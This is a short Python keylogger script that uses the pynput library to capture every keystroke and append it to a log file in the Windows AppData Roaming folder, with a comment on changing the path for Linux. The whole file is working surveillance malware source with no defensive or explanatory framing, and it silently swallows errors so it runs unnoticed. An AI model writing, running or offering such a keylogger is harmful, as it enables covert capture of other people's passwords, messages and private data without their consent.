from pynput import keyboard
import os

strokes = os.path.expanduser("~") + "\\AppData\\Roaming\\log.txt"  #This path is only for windows . If you are in linux then edit the path

def on_press(key):
    try:
        with open(strokes, "a") as file:
            file.write(str(key) + "\n")
    except Exception as e:
        pass

listener = keyboard.Listener(on_press=on_press)
listener.start()
listener.join()
